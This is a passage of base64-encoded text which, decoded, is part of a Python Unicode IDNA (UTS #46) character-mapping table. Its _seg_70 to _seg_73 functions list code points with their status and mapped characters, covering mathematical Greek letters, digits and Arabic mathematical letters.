nLCBcJ1x4Y2ZceDgwXCcpLFxuICAgICgweDFEN0JBLCBcJ01cJywgXCdceGNmXHg4MVwnKSxcbiAgICAoMHgxRDdCQiwgXCdNXCcsIFwnXHhjZlx4ODNcJyksXG4gICAgKDB4MUQ3QkQsIFwnTVwnLCBcJ1x4Y2ZceDg0XCcpLFxuICAgICgweDFEN0JFLCBcJ01cJywgXCdceGNmXHg4NVwnKSxcbiAgICAoMHgxRDdCRiwgXCdNXCcsIFwnXHhjZlx4ODZcJyksXG4gICAgKDB4MUQ3QzAsIFwnTVwnLCBcJ1x4Y2ZceDg3XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNzAoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFEN0MxLCBcJ01cJywgXCdceGNmXHg4OFwnKSxcbiAgICAoMHgxRDdDMiwgXCdNXCcsIFwnXHhjZlx4ODlcJyksXG4gICAgKDB4MUQ3QzMsIFwnTVwnLCBcJ1x4ZTJceDg4XHg4MlwnKSxcbiAgICAoMHgxRDdDNCwgXCdNXCcsIFwnXHhjZVx4YjVcJyksXG4gICAgKDB4MUQ3QzUsIFwnTVwnLCBcJ1x4Y2VceGI4XCcpLFxuICAgICgweDFEN0M2LCBcJ01cJywgXCdceGNlXHhiYVwnKSxcbiAgICAoMHgxRDdDNywgXCdNXCcsIFwnXHhjZlx4ODZcJyksXG4gICAgKDB4MUQ3QzgsIFwnTVwnLCBcJ1x4Y2ZceDgxXCcpLFxuICAgICgweDFEN0M5LCBcJ01cJywgXCdceGNmXHg4MFwnKSxcbiAgICAoMHgxRDdDQSwgXCdNXCcsIFwnXHhjZlx4OWRcJyksXG4gICAgKDB4MUQ3Q0MsIFwnWFwnKSxcbiAgICAoMHgxRDdDRSwgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgxRDdDRiwgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgxRDdEMCwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgxRDdEMSwgXCdNXCcsIFwnM1wnKSxcbiAgICAoMHgxRDdEMiwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgxRDdEMywgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgxRDdENCwgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgxRDdENSwgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgxRDdENiwgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgxRDdENywgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgxRDdEOCwgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgxRDdEOSwgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgxRDdEQSwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgxRDdEQiwgXCdNXCcsIFwnM1wnKSxcbiAgICAoMHgxRDdEQywgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgxRDdERCwgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgxRDdERSwgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgxRDdERiwgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgxRDdFMCwgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgxRDdFMSwgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgxRDdFMiwgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgxRDdFMywgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgxRDdFNCwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgxRDdFNSwgXCdNXCcsIFwnM1wnKSxcbiAgICAoMHgxRDdFNiwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgxRDdFNywgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgxRDdFOCwgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgxRDdFOSwgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgxRDdFQSwgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgxRDdFQiwgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgxRDdFQywgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgxRDdFRCwgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgxRDdFRSwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgxRDdFRiwgXCdNXCcsIFwnM1wnKSxcbiAgICAoMHgxRDdGMCwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgxRDdGMSwgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgxRDdGMiwgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgxRDdGMywgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgxRDdGNCwgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgxRDdGNSwgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgxRDdGNiwgXCdNXCcsIFwnMFwnKSxcbiAgICAoMHgxRDdGNywgXCdNXCcsIFwnMVwnKSxcbiAgICAoMHgxRDdGOCwgXCdNXCcsIFwnMlwnKSxcbiAgICAoMHgxRDdGOSwgXCdNXCcsIFwnM1wnKSxcbiAgICAoMHgxRDdGQSwgXCdNXCcsIFwnNFwnKSxcbiAgICAoMHgxRDdGQiwgXCdNXCcsIFwnNVwnKSxcbiAgICAoMHgxRDdGQywgXCdNXCcsIFwnNlwnKSxcbiAgICAoMHgxRDdGRCwgXCdNXCcsIFwnN1wnKSxcbiAgICAoMHgxRDdGRSwgXCdNXCcsIFwnOFwnKSxcbiAgICAoMHgxRDdGRiwgXCdNXCcsIFwnOVwnKSxcbiAgICAoMHgxRDgwMCwgXCdWXCcpLFxuICAgICgweDFEQThDLCBcJ1hcJyksXG4gICAgKDB4MURBOUIsIFwnVlwnKSxcbiAgICAoMHgxREFBMCwgXCdYXCcpLFxuICAgICgweDFEQUExLCBcJ1ZcJyksXG4gICAgKDB4MURBQjAsIFwnWFwnKSxcbiAgICAoMHgxREYwMCwgXCdWXCcpLFxuICAgICgweDFERjFGLCBcJ1hcJyksXG4gICAgKDB4MUUwMDAsIFwnVlwnKSxcbiAgICAoMHgxRTAwNywgXCdYXCcpLFxuICAgICgweDFFMDA4LCBcJ1ZcJyksXG4gICAgKDB4MUUwMTksIFwnWFwnKSxcbiAgICAoMHgxRTAxQiwgXCdWXCcpLFxuICAgICgweDFFMDIyLCBcJ1hcJyksXG4gICAgKDB4MUUwMjMsIFwnVlwnKSxcbiAgICAoMHgxRTAyNSwgXCdYXCcpLFxuICAgICgweDFFMDI2LCBcJ1ZcJyksXG4gICAgKDB4MUUwMkIsIFwnWFwnKSxcbiAgICAoMHgxRTEwMCwgXCdWXCcpLFxuICAgICgweDFFMTJELCBcJ1hcJyksXG4gICAgKDB4MUUxMzAsIFwnVlwnKSxcbiAgICAoMHgxRTEzRSwgXCdYXCcpLFxuICAgICgweDFFMTQwLCBcJ1ZcJyksXG4gICAgKDB4MUUxNEEsIFwnWFwnKSxcbiAgICAoMHgxRTE0RSwgXCdWXCcpLFxuICAgICgweDFFMTUwLCBcJ1hcJyksXG4gICAgKDB4MUUyOTAsIFwnVlwnKSxcbiAgICAoMHgxRTJBRiwgXCdYXCcpLFxuICAgICgweDFFMkMwLCBcJ1ZcJyksXG4gICAgKDB4MUUyRkEsIFwnWFwnKSxcbiAgICAoMHgxRTJGRiwgXCdWXCcpLFxuICAgICgweDFFMzAwLCBcJ1hcJyksXG4gICAgKDB4MUU3RTAsIFwnVlwnKSxcbiAgICAoMHgxRTdFNywgXCdYXCcpLFxuICAgICgweDFFN0U4LCBcJ1ZcJyksXG4gICAgKDB4MUU3RUMsIFwnWFwnKSxcbiAgICAoMHgxRTdFRCwgXCdWXCcpLFxuICAgICgweDFFN0VGLCBcJ1hcJyksXG4gICAgKDB4MUU3RjAsIFwnVlwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzcxKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxRTdGRiwgXCdYXCcpLFxuICAgICgweDFFODAwLCBcJ1ZcJyksXG4gICAgKDB4MUU4QzUsIFwnWFwnKSxcbiAgICAoMHgxRThDNywgXCdWXCcpLFxuICAgICgweDFFOEQ3LCBcJ1hcJyksXG4gICAgKDB4MUU5MDAsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTJcJyksXG4gICAgKDB4MUU5MDEsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTNcJyksXG4gICAgKDB4MUU5MDIsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTRcJyksXG4gICAgKDB4MUU5MDMsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTVcJyksXG4gICAgKDB4MUU5MDQsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTZcJyksXG4gICAgKDB4MUU5MDUsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTdcJyksXG4gICAgKDB4MUU5MDYsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YThcJyksXG4gICAgKDB4MUU5MDcsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YTlcJyksXG4gICAgKDB4MUU5MDgsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWFcJyksXG4gICAgKDB4MUU5MDksIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWJcJyksXG4gICAgKDB4MUU5MEEsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWNcJyksXG4gICAgKDB4MUU5MEIsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWRcJyksXG4gICAgKDB4MUU5MEMsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWVcJyksXG4gICAgKDB4MUU5MEQsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YWZcJyksXG4gICAgKDB4MUU5MEUsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjBcJyksXG4gICAgKDB4MUU5MEYsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjFcJyksXG4gICAgKDB4MUU5MTAsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjJcJyksXG4gICAgKDB4MUU5MTEsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjNcJyksXG4gICAgKDB4MUU5MTIsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjRcJyksXG4gICAgKDB4MUU5MTMsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjVcJyksXG4gICAgKDB4MUU5MTQsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjZcJyksXG4gICAgKDB4MUU5MTUsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjdcJyksXG4gICAgKDB4MUU5MTYsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjhcJyksXG4gICAgKDB4MUU5MTcsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YjlcJyksXG4gICAgKDB4MUU5MTgsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmFcJyksXG4gICAgKDB4MUU5MTksIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmJcJyksXG4gICAgKDB4MUU5MUEsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmNcJyksXG4gICAgKDB4MUU5MUIsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmRcJyksXG4gICAgKDB4MUU5MUMsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmVcJyksXG4gICAgKDB4MUU5MUQsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNFx4YmZcJyksXG4gICAgKDB4MUU5MUUsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNVx4ODBcJyksXG4gICAgKDB4MUU5MUYsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNVx4ODFcJyksXG4gICAgKDB4MUU5MjAsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNVx4ODJcJyksXG4gICAgKDB4MUU5MjEsIFwnTVwnLCBcJ1x4ZjBceDllXHhhNVx4ODNcJyksXG4gICAgKDB4MUU5MjIsIFwnVlwnKSxcbiAgICAoMHgxRTk0QywgXCdYXCcpLFxuICAgICgweDFFOTUwLCBcJ1ZcJyksXG4gICAgKDB4MUU5NUEsIFwnWFwnKSxcbiAgICAoMHgxRTk1RSwgXCdWXCcpLFxuICAgICgweDFFOTYwLCBcJ1hcJyksXG4gICAgKDB4MUVDNzEsIFwnVlwnKSxcbiAgICAoMHgxRUNCNSwgXCdYXCcpLFxuICAgICgweDFFRDAxLCBcJ1ZcJyksXG4gICAgKDB4MUVEM0UsIFwnWFwnKSxcbiAgICAoMHgxRUUwMCwgXCdNXCcsIFwnXHhkOFx4YTdcJyksXG4gICAgKDB4MUVFMDEsIFwnTVwnLCBcJ1x4ZDhceGE4XCcpLFxuICAgICgweDFFRTAyLCBcJ01cJywgXCdceGQ4XHhhY1wnKSxcbiAgICAoMHgxRUUwMywgXCdNXCcsIFwnXHhkOFx4YWZcJyksXG4gICAgKDB4MUVFMDQsIFwnWFwnKSxcbiAgICAoMHgxRUUwNSwgXCdNXCcsIFwnXHhkOVx4ODhcJyksXG4gICAgKDB4MUVFMDYsIFwnTVwnLCBcJ1x4ZDhceGIyXCcpLFxuICAgICgweDFFRTA3LCBcJ01cJywgXCdceGQ4XHhhZFwnKSxcbiAgICAoMHgxRUUwOCwgXCdNXCcsIFwnXHhkOFx4YjdcJyksXG4gICAgKDB4MUVFMDksIFwnTVwnLCBcJ1x4ZDlceDhhXCcpLFxuICAgICgweDFFRTBBLCBcJ01cJywgXCdceGQ5XHg4M1wnKSxcbiAgICAoMHgxRUUwQiwgXCdNXCcsIFwnXHhkOVx4ODRcJyksXG4gICAgKDB4MUVFMEMsIFwnTVwnLCBcJ1x4ZDlceDg1XCcpLFxuICAgICgweDFFRTBELCBcJ01cJywgXCdceGQ5XHg4NlwnKSxcbiAgICAoMHgxRUUwRSwgXCdNXCcsIFwnXHhkOFx4YjNcJyksXG4gICAgKDB4MUVFMEYsIFwnTVwnLCBcJ1x4ZDhceGI5XCcpLFxuICAgICgweDFFRTEwLCBcJ01cJywgXCdceGQ5XHg4MVwnKSxcbiAgICAoMHgxRUUxMSwgXCdNXCcsIFwnXHhkOFx4YjVcJyksXG4gICAgKDB4MUVFMTIsIFwnTVwnLCBcJ1x4ZDlceDgyXCcpLFxuICAgICgweDFFRTEzLCBcJ01cJywgXCdceGQ4XHhiMVwnKSxcbiAgICAoMHgxRUUxNCwgXCdNXCcsIFwnXHhkOFx4YjRcJyksXG4gICAgKDB4MUVFMTUsIFwnTVwnLCBcJ1x4ZDhceGFhXCcpLFxuICAgICgweDFFRTE2LCBcJ01cJywgXCdceGQ4XHhhYlwnKSxcbiAgICAoMHgxRUUxNywgXCdNXCcsIFwnXHhkOFx4YWVcJyksXG4gICAgKDB4MUVFMTgsIFwnTVwnLCBcJ1x4ZDhceGIwXCcpLFxuICAgICgweDFFRTE5LCBcJ01cJywgXCdceGQ4XHhiNlwnKSxcbiAgICAoMHgxRUUxQSwgXCdNXCcsIFwnXHhkOFx4YjhcJyksXG4gICAgKDB4MUVFMUIsIFwnTVwnLCBcJ1x4ZDhceGJhXCcpLFxuICAgICgweDFFRTFDLCBcJ01cJywgXCdceGQ5XHhhZVwnKSxcbiAgICAoMHgxRUUxRCwgXCdNXCcsIFwnXHhkYVx4YmFcJyksXG4gICAgKDB4MUVFMUUsIFwnTVwnLCBcJ1x4ZGFceGExXCcpLFxuICAgICgweDFFRTFGLCBcJ01cJywgXCdceGQ5XHhhZlwnKSxcbiAgICAoMHgxRUUyMCwgXCdYXCcpLFxuICAgICgweDFFRTIxLCBcJ01cJywgXCdceGQ4XHhhOFwnKSxcbiAgICAoMHgxRUUyMiwgXCdNXCcsIFwnXHhkOFx4YWNcJyksXG4gICAgKDB4MUVFMjMsIFwnWFwnKSxcbiAgICAoMHgxRUUyNCwgXCdNXCcsIFwnXHhkOVx4ODdcJyksXG4gICAgKDB4MUVFMjUsIFwnWFwnKSxcbiAgICAoMHgxRUUyNywgXCdNXCcsIFwnXHhkOFx4YWRcJyksXG4gICAgKDB4MUVFMjgsIFwnWFwnKSxcbiAgICAoMHgxRUUyOSwgXCdNXCcsIFwnXHhkOVx4OGFcJyksXG4gICAgKDB4MUVFMkEsIFwnTVwnLCBcJ1x4ZDlceDgzXCcpLFxuICAgICgweDFFRTJCLCBcJ01cJywgXCdceGQ5XHg4NFwnKSxcbiAgICAoMHgxRUUyQywgXCdNXCcsIFwnXHhkOVx4ODVcJyksXG4gICAgKDB4MUVFMkQsIFwnTVwnLCBcJ1x4ZDlceDg2XCcpLFxuICAgICgweDFFRTJFLCBcJ01cJywgXCdceGQ4XHhiM1wnKSxcbiAgICAoMHgxRUUyRiwgXCdNXCcsIFwnXHhkOFx4YjlcJyksXG4gICAgKDB4MUVFMzAsIFwnTVwnLCBcJ1x4ZDlceDgxXCcpLFxuICAgICgweDFFRTMxLCBcJ01cJywgXCdceGQ4XHhiNVwnKSxcbiAgICAoMHgxRUUzMiwgXCdNXCcsIFwnXHhkOVx4ODJcJyksXG4gICAgKDB4MUVFMzMsIFwnWFwnKSxcbiAgICBdXG5cbmRlZiBfc2VnXzcyKCkgLT4gTGlzdFtVbmlvbltUdXBsZVtpbnQsIHN0cl0sIFR1cGxlW2ludCwgc3RyLCBzdHJdXV06XG4gICAgcmV0dXJuIFtcbiAgICAoMHgxRUUzNCwgXCdNXCcsIFwnXHhkOFx4YjRcJyksXG4gICAgKDB4MUVFMzUsIFwnTVwnLCBcJ1x4ZDhceGFhXCcpLFxuICAgICgweDFFRTM2LCBcJ01cJywgXCdceGQ4XHhhYlwnKSxcbiAgICAoMHgxRUUzNywgXCdNXCcsIFwnXHhkOFx4YWVcJyksXG4gICAgKDB4MUVFMzgsIFwnWFwnKSxcbiAgICAoMHgxRUUzOSwgXCdNXCcsIFwnXHhkOFx4YjZcJyksXG4gICAgKDB4MUVFM0EsIFwnWFwnKSxcbiAgICAoMHgxRUUzQiwgXCdNXCcsIFwnXHhkOFx4YmFcJyksXG4gICAgKDB4MUVFM0MsIFwnWFwnKSxcbiAgICAoMHgxRUU0MiwgXCdNXCcsIFwnXHhkOFx4YWNcJyksXG4gICAgKDB4MUVFNDMsIFwnWFwnKSxcbiAgICAoMHgxRUU0NywgXCdNXCcsIFwnXHhkOFx4YWRcJyksXG4gICAgKDB4MUVFNDgsIFwnWFwnKSxcbiAgICAoMHgxRUU0OSwgXCdNXCcsIFwnXHhkOVx4OGFcJyksXG4gICAgKDB4MUVFNEEsIFwnWFwnKSxcbiAgICAoMHgxRUU0QiwgXCdNXCcsIFwnXHhkOVx4ODRcJyksXG4gICAgKDB4MUVFNEMsIFwnWFwnKSxcbiAgICAoMHgxRUU0RCwgXCdNXCcsIFwnXHhkOVx4ODZcJyksXG4gICAgKDB4MUVFNEUsIFwnTVwnLCBcJ1x4ZDhceGIzXCcpLFxuICAgICgweDFFRTRGLCBcJ01cJywgXCdceGQ4XHhiOVwnKSxcbiAgICAoMHgxRUU1MCwgXCdYXCcpLFxuICAgICgweDFFRTUxLCBcJ01cJywgXCdceGQ4XHhiNVwnKSxcbiAgICAoMHgxRUU1MiwgXCdNXCcsIFwnXHhkOVx4ODJcJyksXG4gICAgKDB4MUVFNTMsIFwnWFwnKSxcbiAgICAoMHgxRUU1NCwgXCdNXCcsIFwnXHhkOFx4YjRcJyksXG4gICAgKDB4MUVFNTUsIFwnWFwnKSxcbiAgICAoMHgxRUU1NywgXCdNXCcsIFwnXHhkOFx4YWVcJyksXG4gICAgKDB4MUVFNTgsIFwnWFwnKSxcbiAgICAoMHgxRUU1OSwgXCdNXCcsIFwnXHhkOFx4YjZcJyksXG4gICAgKDB4MUVFNUEsIFwnWFwnKSxcbiAgICAoMHgxRUU1QiwgXCdNXCcsIFwnXHhkOFx4YmFcJyksXG4gICAgKDB4MUVFNUMsIFwnWFwnKSxcbiAgICAoMHgxRUU1RCwgXCdNXCcsIFwnXHhkYVx4YmFcJyksXG4gICAgKDB4MUVFNUUsIFwnWFwnKSxcbiAgICAoMHgxRUU1RiwgXCdNXCcsIFwnXHhkOVx4YWZcJyksXG4gICAgKDB4MUVFNjAsIFwnWFwnKSxcbiAgICAoMHgxRUU2MSwgXCdNXCcsIFwnXHhkOFx4YThcJyksXG4gICAgKDB4MUVFNjIsIFwnTVwnLCBcJ1x4ZDhceGFjXCcpLFxuICAgICgweDFFRTYzLCBcJ1hcJyksXG4gICAgKDB4MUVFNjQsIFwnTVwnLCBcJ1x4ZDlceDg3XCcpLFxuICAgICgweDFFRTY1LCBcJ1hcJyksXG4gICAgKDB4MUVFNjcsIFwnTVwnLCBcJ1x4ZDhceGFkXCcpLFxuICAgICgweDFFRTY4LCBcJ01cJywgXCdceGQ4XHhiN1wnKSxcbiAgICAoMHgxRUU2OSwgXCdNXCcsIFwnXHhkOVx4OGFcJyksXG4gICAgKDB4MUVFNkEsIFwnTVwnLCBcJ1x4ZDlceDgzXCcpLFxuICAgICgweDFFRTZCLCBcJ1hcJyksXG4gICAgKDB4MUVFNkMsIFwnTVwnLCBcJ1x4ZDlceDg1XCcpLFxuICAgICgweDFFRTZELCBcJ01cJywgXCdceGQ5XHg4NlwnKSxcbiAgICAoMHgxRUU2RSwgXCdNXCcsIFwnXHhkOFx4YjNcJyksXG4gICAgKDB4MUVFNkYsIFwnTVwnLCBcJ1x4ZDhceGI5XCcpLFxuICAgICgweDFFRTcwLCBcJ01cJywgXCdceGQ5XHg4MVwnKSxcbiAgICAoMHgxRUU3MSwgXCdNXCcsIFwnXHhkOFx4YjVcJyksXG4gICAgKDB4MUVFNzIsIFwnTVwnLCBcJ1x4ZDlceDgyXCcpLFxuICAgICgweDFFRTczLCBcJ1hcJyksXG4gICAgKDB4MUVFNzQsIFwnTVwnLCBcJ1x4ZDhceGI0XCcpLFxuICAgICgweDFFRTc1LCBcJ01cJywgXCdceGQ4XHhhYVwnKSxcbiAgICAoMHgxRUU3NiwgXCdNXCcsIFwnXHhkOFx4YWJcJyksXG4gICAgKDB4MUVFNzcsIFwnTVwnLCBcJ1x4ZDhceGFlXCcpLFxuICAgICgweDFFRTc4LCBcJ1hcJyksXG4gICAgKDB4MUVFNzksIFwnTVwnLCBcJ1x4ZDhceGI2XCcpLFxuICAgICgweDFFRTdBLCBcJ01cJywgXCdceGQ4XHhiOFwnKSxcbiAgICAoMHgxRUU3QiwgXCdNXCcsIFwnXHhkOFx4YmFcJyksXG4gICAgKDB4MUVFN0MsIFwnTVwnLCBcJ1x4ZDlceGFlXCcpLFxuICAgICgweDFFRTdELCBcJ1hcJyksXG4gICAgKDB4MUVFN0UsIFwnTVwnLCBcJ1x4ZGFceGExXCcpLFxuICAgICgweDFFRTdGLCBcJ1hcJyksXG4gICAgKDB4MUVFODAsIFwnTVwnLCBcJ1x4ZDhceGE3XCcpLFxuICAgICgweDFFRTgxLCBcJ01cJywgXCdceGQ4XHhhOFwnKSxcbiAgICAoMHgxRUU4MiwgXCdNXCcsIFwnXHhkOFx4YWNcJyksXG4gICAgKDB4MUVFODMsIFwnTVwnLCBcJ1x4ZDhceGFmXCcpLFxuICAgICgweDFFRTg0LCBcJ01cJywgXCdceGQ5XHg4N1wnKSxcbiAgICAoMHgxRUU4NSwgXCdNXCcsIFwnXHhkOVx4ODhcJyksXG4gICAgKDB4MUVFODYsIFwnTVwnLCBcJ1x4ZDhceGIyXCcpLFxuICAgICgweDFFRTg3LCBcJ01cJywgXCdceGQ4XHhhZFwnKSxcbiAgICAoMHgxRUU4OCwgXCdNXCcsIFwnXHhkOFx4YjdcJyksXG4gICAgKDB4MUVFODksIFwnTVwnLCBcJ1x4ZDlceDhhXCcpLFxuICAgICgweDFFRThBLCBcJ1hcJyksXG4gICAgKDB4MUVFOEIsIFwnTVwnLCBcJ1x4ZDlceDg0XCcpLFxuICAgICgweDFFRThDLCBcJ01cJywgXCdceGQ5XHg4NVwnKSxcbiAgICAoMHgxRUU4RCwgXCdNXCcsIFwnXHhkOVx4ODZcJyksXG4gICAgKDB4MUVFOEUsIFwnTVwnLCBcJ1x4ZDhceGIzXCcpLFxuICAgICgweDFFRThGLCBcJ01cJywgXCdceGQ4XHhiOVwnKSxcbiAgICAoMHgxRUU5MCwgXCdNXCcsIFwnXHhkOVx4ODFcJyksXG4gICAgKDB4MUVFOTEsIFwnTVwnLCBcJ1x4ZDhceGI1XCcpLFxuICAgICgweDFFRTkyLCBcJ01cJywgXCdceGQ5XHg4MlwnKSxcbiAgICAoMHgxRUU5MywgXCdNXCcsIFwnXHhkOFx4YjFcJyksXG4gICAgKDB4MUVFOTQsIFwnTVwnLCBcJ1x4ZDhceGI0XCcpLFxuICAgICgweDFFRTk1LCBcJ01cJywgXCdceGQ4XHhhYVwnKSxcbiAgICAoMHgxRUU5NiwgXCdNXCcsIFwnXHhkOFx4YWJcJyksXG4gICAgKDB4MUVFOTcsIFwnTVwnLCBcJ1x4ZDhceGFlXCcpLFxuICAgICgweDFFRTk4LCBcJ01cJywgXCdceGQ4XHhiMFwnKSxcbiAgICAoMHgxRUU5OSwgXCdNXCcsIFwnXHhkOFx4YjZcJyksXG4gICAgKDB4MUVFOUEsIFwnTVwnLCBcJ1x4ZDhceGI4XCcpLFxuICAgICgweDFFRTlCLCBcJ01cJywgXCdceGQ4XHhiYVwnKSxcbiAgICAoMHgxRUU5QywgXCdYXCcpLFxuICAgICgweDFFRUExLCBcJ01cJywgXCdceGQ4XHhhOFwnKSxcbiAgICAoMHgxRUVBMiwgXCdNXCcsIFwnXHhkOFx4YWNcJyksXG4gICAgKDB4MUVFQTMsIFwnTVwnLCBcJ1x4ZDhceGFmXCcpLFxuICAgICgweDFFRUE0LCBcJ1hcJyksXG4gICAgKDB4MUVFQTUsIFwnTVwnLCBcJ1x4ZDlceDg4XCcpLFxuICAgIF1cblxuZGVmIF9zZWdfNzMoKSAtPiBMaXN0W1VuaW9uW1R1cGxlW2ludCwgc3RyXSwgVHVwbGVbaW50LCBzdHIsIHN0cl1dXTpcbiAgICByZXR1cm4gW1xuICAgICgweDFFRUE2LCBcJ01cJywgXCdceGQ4XHhiMlwnKSxcbiAgICAoMHgxRUVBNywgXCdNXCcsIFwnXHhkOFx4YWRcJyksXG4gICAgKDB4MUVFQTgsIFwnTVwnLCBcJ1x4ZDhceGI3XCcpLFxuICAgICgweDFFRUE5LCBcJ01cJywgXCdceGQ5XHg4YVwnKSxcbiAgICAoMHgxRUVBQSwgXCdYXCcpLFxuICAgICgweDFFRUFCLCBcJ01cJywgXCdceGQ5XHg4NFwnKSxcbiAgICAoMHgxRUVBQywgXCdNXCcsIFwnXHhkOVx4ODVcJyksXG4gICAgKDB4MUVFQUQsIFwnTVwnLCBcJ1x4ZDlceDg2XCcpLFxuICAgICgweDFFRUFFLCBcJ01cJywgXCdceGQ4XHhiM1wnKSxcbiAgICAoMHgxRUVBRiwgXCdNXCcsIFwnXHhkOFx4YjlcJyksXG4gICAgKDB4MUVFQjAsIFwnTVwnLCBcJ1x4ZDlceDgxXCcpLFxuICAgICgweDFFRUIxLCBcJ01cJywgXCdceGQ4XHhiNVwnKSxcbiAgICAoMHgxRUVCMiwgXCdNXCcsIFwnXHhkOVx4ODJcJyksXG4gICAgKDB4MUVFQjMsIFwnTVwnLCBcJ1x4ZDhceGIxXCcpLFxuICAgICgweDFFRUI0LCBcJ01cJywgXCdceGQ4XHhiNFwnKSxcbiAgICAoMHgxRUVCNSwgXCdNXCcsIFwnXHhkOFx4YWFcJyksXG4gICAgKDB4MUVFQjYsIFwnTVwnLCBcJ1x4ZDhceGFiXCcpLFxuICAgICgweDFFRUI3LCBcJ01cJywgXCdceGQ4XHhhZVwnKSxcbiAgICAoMHgxRUVCOCwgXCdNXCcsIFwnXHhkOFx4YjBcJyksXG4gICAgKDB4MUVFQjksIFwnTVwnLCBcJ1x4ZDhceGI2XCcpLFxuICAgICgweDFFRUJBLCBcJ01cJywgXCdceGQ4XHhiOFwnKSxcbiAgICAoMHgxRUVCQiwgXCdNXCcsIFwnXHhkOFx4YmFcJyksXG4gICAgKDB4MUVFQkMsIFwnWFwnKSxcbiAgICAoMHgxRUVGMCwgXCdWXCcpLFxuICAgICgweDFFRUYyLCBcJ1hcJyksXG4gICAgKDB4MUYwMDAsIFwnVlwnKSxcbiAgICAoMHgxRjAyQywgXCdYXCcpLFxuICAgICgweDFGMDMwLCBcJ1ZcJyksXG4gICAgKDB4MUYwOTQsIFwnWFwnKSxcbiAgICAoMHgxRjBBMCwgXCdWXCcpLFxuICAgICgweDFGMEFGLCBcJ1hcJyksXG4gICAgKDB4MUYwQjEsIFwnVlwnKSxcbiAgICAoMHgxRjBDMCwgXCdYXCcpLFxuICAgICgweDFGMEMxLCBcJ1ZcJyksXG4gICAgKDB4MUYwRDAsIFwnWFwnKSxcbiAgICAoMHgxRjBEMSwgXCdWXCcpLFxuICAgICgweDFGMEY2LCBcJ1hcJyksXG4gICAgKDB4MUYxMDEsIFwnM1wnLCBcJzAsXCcpLFxuICAgICgweDFGMTAyLCBcJzNcJywgXCcxLFwnKSxcbiAgICAoMHgxRjEwMywgXCczXCcsIFwnMixcJyksXG4gICAgKDB4MUYxMDQsIFwnM1wnLCBcJzMsXCcpLFxuICAgICgweDFGMTA1LCBcJzNcJywgXCc0LFwnKSxcbiAgICAoMHgxRjEwNiwgXCczXCcsI